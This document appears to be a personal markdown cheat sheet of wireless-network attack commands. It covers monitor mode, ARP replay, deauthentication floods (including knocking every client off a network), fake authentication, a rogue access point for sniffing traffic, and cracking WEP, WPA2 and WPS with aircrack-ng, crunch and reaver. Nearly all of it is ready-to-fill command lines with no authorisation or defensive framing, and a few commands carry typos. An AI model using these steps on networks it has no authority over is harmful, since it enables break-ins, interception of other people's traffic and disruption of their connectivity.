# Table of Contents
- [attacks](#attacks)
- [airodump commands](#airodump-commands)

<br>
<br>

# attacks
normally most of the attacks require to have an interface in monitor mode.  
to do this we use the following command:
```
iwconfig wlan0 mode monitor
```
1) arp request attack
```
aireplay-ng --arpreplay -b <mac of network> -h <adapter wireless mac> <adapter wireless name>
```
2) deauth attack
```
aireplay-ng --deauth 1000 -a <mac of network> -c <mac of client> <interface>
```
3) fake auth attack
```
aireplay-ng --fakeauth 0 -a <mac of network> -h <mac of my wireless adapter> <name of wireless adapter>
```
4) fake access point  
  a) we first need to download mana-toolkit in order to fake an access point.  
  b) modify settings on /etc/mana-toolkit/hostapd-mana.conf  
  c) modify the script also on /usr/share/mana-toolkit/run-mana/start-nat-simple.sh  
  d) then run the script  
  ```
  bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
  ```
  &nbsp;&nbsp;&nbsp;&nbsp;e) if it failed run this command again  (maybe use the --arp-spoofing argument)  
  &nbsp;&nbsp;&nbsp;&nbsp;f) now you can sniff packets with wireshark :)

  <br>

5) crack wep password.    
  a) first sniff data
  ```
airodump-ng --bssid <mac of wifi> --channel <channel of wifi> --write <path to store wlan0mon>
```
&nbsp;&nbsp;&nbsp;&nbsp;b) now crack the cap file
``` 
aircrack-ng <cap file>
```
&nbsp;&nbsp;&nbsp;&nbsp;c) change the key to ascii and connect  

  <br>
  &nbsp;&nbsp;&nbsp;&nbsp;if the network is low on traffic we will do like this: 

&nbsp;&nbsp;&nbsp;&nbsp;a) we first scan the network for packets  
  ```
airodump-ng --bssid <mac of network> --chanel <channel of network> --write <output path> <wireless adapter name>
```
&nbsp;&nbsp;&nbsp;&nbsp;b) then we will send a fake auth attack  
```
aireplay-ng --fakeauth 0 -a <mac of network> -h <adapter wireless mac> <adapter wireless name>
```
&nbsp;&nbsp;&nbsp;&nbsp;this will make us associate with the network

&nbsp;&nbsp;&nbsp;&nbsp;c) then we will launch a arp replay attack  
```
aireplay-ng --arpreplay -b <mac of network> -h <adapter wireless mac> <adapter wireless name>
```
&nbsp;&nbsp;&nbsp;&nbsp;d) then we give it the cap file  
```
aircrack-ng <path to cap file>
```
<br>

6) crack wpa2 password  
a) see which wlan adapters you have  
```
airmon-ng 
```
&nbsp;&nbsp;&nbsp;&nbsp;b) kill active connections  
```
airmon-ng check kill
```
&nbsp;&nbsp;&nbsp;&nbsp;c) start monitor  
```
airmon-ng start wlan0
```
&nbsp;&nbsp;&nbsp;&nbsp;d) find the wifi you want to attack  
```
airodump-ng wlan0mon
```
&nbsp;&nbsp;&nbsp;&nbsp;e) sniff it for the password  
```
airodump-ng --bssid <mac address of wifi> -c <channel of wifi> --write <name of file to save to> wlan0mon
```
&nbsp;&nbsp;&nbsp;&nbsp;we do this until we get a wpa handshake flag on the scan.  
&nbsp;&nbsp;&nbsp;&nbsp;if we got the mac adress and channel of someone on this wifi
using airodump-ng, 
&nbsp;&nbsp;&nbsp;&nbsp;we can run this command to make him deauthenticate.  
```
aireplay-ng -0 <number of packets (usually 4)> -a <bssid of device>
-c <station> wlan0mon
```
&nbsp;&nbsp;&nbsp;&nbsp;or if i want i can kick all the devices from the internet by doing this:  
```
aireplay-ng -0 <number of packets (usually 4)> -a <bssid of gateway> wlan0mon
```
&nbsp;&nbsp;&nbsp;&nbsp;now we get the handshake.  

&nbsp;&nbsp;&nbsp;&nbsp;f) then create wordlist for the hash using crunch  
```
crunch <min length> <max length> -t <template> -o output.txt
```
&nbsp;&nbsp;&nbsp;&nbsp;g) crack  
```
aircrack-ng <file saved + .cap> -w output.txt
```
<br>

7) crack wps enabled wifi  
a) first run the scan for wifi with wps enabled.
```
wash -i <interface name>
```
&nbsp;&nbsp;&nbsp;&nbsp;b) then find the pin of the wps
```
reaver --bssid <mac of network> --channel <channel number> --interface <name of etwork interface> -vvv --no-associate
```
&nbsp;&nbsp;&nbsp;&nbsp;if you got error download an older version of reaver.

<br>
<br>

# airodump commands
1) normal use:
```
airodump-ng <inteface-in-monitor-mode>
```
2) for scanning 5ghz wifi:
```
airodump --band a <interface-in-monitor-mode>
```
3) for scanning both 5ghz and 2.4ghz wifi:
```
airodump-ng --band abg <interface-in-nonitor-mode>
```
